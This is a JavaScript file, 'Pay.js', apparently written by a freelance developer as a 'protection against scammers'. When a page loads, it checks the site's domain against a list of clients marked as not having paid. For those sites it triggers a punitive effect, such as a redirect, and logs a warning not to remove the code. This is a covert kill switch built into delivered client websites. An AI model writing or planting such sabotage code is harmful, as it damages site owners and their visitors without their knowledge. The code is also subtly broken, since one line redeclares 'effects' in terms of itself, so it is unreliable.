/*!
 * Pay.js v1.0.0
 * (c) 2024-2024
 * Made to protect against scammers
 * by Deus Notam
 * Telegram Channel → https://t.me/deusnotam
 * Telegram Group → https://t.me/d3usn0tam
 * Данный скрипт отвечает за наказание недобросовестных заказчиков.
 */

// data.js
import { data } from './data.js';

// Теперь вы можете использовать значение data в pay.js
console.log(data);
// effects.js
import { effects } from '/scripts/effects.js';

document.addEventListener("DOMContentLoaded", function() {
// Массив с сайтами и параметрами
const sites = data;

// Массив с эффектами
const effects = effects;

// Функция для проверки домена
function checkDomain() {
    const currentDomain = window.location.hostname;

    // Проверка, есть ли текущий домен в списке
    const siteInfo = sites.find(site => currentDomain === new URL(site.url).hostname);

    if (!siteInfo) {
        // Обработка случая, когда домен не найден в списке
        console.log("Наказаний не найдено. Заказчик чист.");
    } else {
        // Проверка, если case у домена равен "didnt pay"
        if (siteInfo.case === "didnt pay") {
            // Применение эффекта, если домен найден в списке и case равен "didnt pay"
            const effectFunction = effects[siteInfo.effect];
            if (effectFunction) {
                effectFunction(siteInfo.redirecturl || siteInfo.date);
                console.log(`Этот заказчик ${siteInfo.date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
            }
        }
    }
}

// Вызов функции для проверки домена
checkDomain();
});
